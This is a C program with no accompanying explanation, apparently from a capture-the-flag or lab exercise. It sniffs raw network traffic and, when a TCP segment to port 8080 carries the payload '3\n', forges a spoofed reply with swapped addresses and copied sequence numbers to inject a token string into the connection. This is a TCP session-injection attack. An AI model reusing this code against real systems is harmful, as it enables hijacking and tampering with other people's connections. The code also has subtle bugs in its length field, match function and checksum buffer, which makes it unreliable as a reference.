#include<netinet/in.h>
#include<errno.h>
#include<netdb.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>
 
#include<netinet/ip_icmp.h>
#include<netinet/udp.h>
#include<netinet/tcp.h>
#include<netinet/ip.h>
#include<netinet/if_ether.h>
#include<net/ethernet.h>
#include<sys/socket.h>
#include<arpa/inet.h>
#include<sys/ioctl.h>
#include<sys/time.h>
#include<sys/types.h>
#include<unistd.h>
 
void process_packet(unsigned char* , int);
void handle_tcp_packet(unsigned char * , int );
 
struct sockaddr_in source,dest;

struct packet {
    struct iphdr ip;
    struct tcphdr tcp;
    char data[27];
};

uint16_t in_cksum(uint16_t *addr, size_t len)
{
	register int nleft = len;
	register uint16_t *w = addr;
	register int sum = 0;
	uint16_t answer = 0;

	while (nleft > 1) {
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1) {
		*(u_char *)(&answer) = *(u_char *)w;
		sum += answer;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return answer;
}

void make_packet(struct iphdr *iph, struct tcphdr *tcph, int size) {
    struct packet pk;
    char tcpbuf[4096], *ptr;
    uint16_t s;

    memset(&pk,0,sizeof(pk));
    strcat(pk.data, "START_TOKEN429583END_TOKEN\n");

    // ip header
    pk.ip.ihl = sizeof(pk.ip) >> 2;
    pk.ip.version = 4;
    pk.ip.tos = 0;
    pk.ip.tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    pk.ip.id = iph->id;
    pk.ip.frag_off =  0x000;
    pk.ip.ttl = 64;
    pk.ip.protocol = IPPROTO_TCP;
    pk.ip.saddr = iph->daddr;
    pk.ip.daddr = iph->saddr;

    // tcp header
    pk.tcp.source = tcph->dest;
    pk.tcp.dest = tcph->source;
    pk.tcp.seq = tcph->ack_seq;
    pk.tcp.ack_seq = htonl(ntohl(tcph->seq) + size);
    pk.tcp.window = htons(224);
    pk.tcp.doff = sizeof(struct tcphdr) >> 2;
    pk.tcp.urg = 0;
    pk.tcp.ack = 1;
    pk.tcp.psh = 1;
    pk.tcp.rst = 0;
    pk.tcp.syn = 0;
    pk.tcp.fin = 0;
    pk.tcp.urg_ptr = 0;

    // build buffer for cksum
	ptr = tcpbuf;
	memset(tcpbuf, 0, sizeof(tcpbuf));
	memcpy(ptr, &(pk.ip.saddr), 8);
	ptr += 9;
	*ptr++ = pk.ip.protocol;
	s = htons(sizeof(pk.data) + sizeof(pk.tcp));
	memcpy(ptr, &s, 2);
	ptr += 2;
	memcpy(ptr, &pk.tcp, sizeof(pk.tcp));
	ptr += sizeof(pk.tcp);
	memcpy(ptr, &pk.data, sizeof(pk.data));

    // calculate checksum
	pk.tcp.th_sum = htons(ntohs(in_cksum((uint16_t *)tcpbuf, sizeof(pk.tcp) + sizeof(pk.data))));

    int sock;
    sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
    struct sockaddr_in daddr;

    daddr.sin_family = AF_INET;
    daddr.sin_addr.s_addr = iph->saddr;
    daddr.sin_port = tcph->dest;
    memset(&daddr.sin_zero, 0, sizeof(daddr.sin_zero));
    sendto( sock, (char *) &pk, sizeof(pk), 0, (struct sockaddr *) &daddr, (socklen_t) sizeof(daddr));
    printf("Sending! %x\n", ntohs(pk.tcp.th_sum));

    /*pk.tcp.seq = htonl(ntohl(tcph->ack_seq) + 1);
    pk.tcp.ack_seq = htonl(ntohl(tcph->seq) + size + 1);
    sendto( sock, (char *) &pk, sizeof(pk), 0, (struct sockaddr *) &daddr, (socklen_t) sizeof(daddr));*/

    close(sock);
}

int find_thing (unsigned char* data , int Size, unsigned char* thing, int thingLen, int exact) {
    if (exact && Size != thingLen)
        return 0;
    for (int i = 0; i < Size; i++) {
        for (int j = 0; j < thingLen; j++) {
            if (data[i + j] != thing[j])
                break;
            return 1;
        }
    }
    return 0;
}
 
int main()
{
    int saddr_size , data_size;
    struct sockaddr saddr;
         
    unsigned char *buffer = (unsigned char *) malloc(65536);
     
    int sock_raw = socket( AF_PACKET , SOCK_RAW , htons(ETH_P_ALL)) ;
     
    if(sock_raw < 0)
    {
        perror("Socket Error");
        return 1;
    }
    while(1)
    {
        saddr_size = sizeof saddr;
        data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , (socklen_t*)&saddr_size);
        if(data_size <0 )
        {
            printf("Recvfrom error , failed to get packets\n");
            return 1;
        }
        process_packet(buffer , data_size);
    }
    close(sock_raw);
    return 0;
}
 
void process_packet(unsigned char* buffer, int size)
{
    struct iphdr *iph = (struct iphdr*)(buffer + sizeof(struct ethhdr));
    switch (iph->protocol)
    {
        case 6:
            handle_tcp_packet(buffer , size);
            break;
         
        default:
            break;
    }
}
 
void handle_tcp_packet(unsigned char* Buffer, int Size)
{
    unsigned short iphdrlen;
     
    struct iphdr *iph = (struct iphdr *)( Buffer  + sizeof(struct ethhdr) );
    iphdrlen = iph->ihl*4;
     
    struct tcphdr *tcph=(struct tcphdr*)(Buffer + iphdrlen + sizeof(struct ethhdr));
             
    int header_size =  sizeof(struct ethhdr) + iphdrlen + tcph->doff*4;
     
    if (ntohs(tcph->dest) == 8080) {
        char findme[] = "3\n";
        int found = find_thing(Buffer + header_size, Size - header_size, findme, 2, 1);
        fprintf(stdout, "Found: %d\n", found);
        if (found)
            make_packet(iph, tcph, Size - header_size);
    }
}
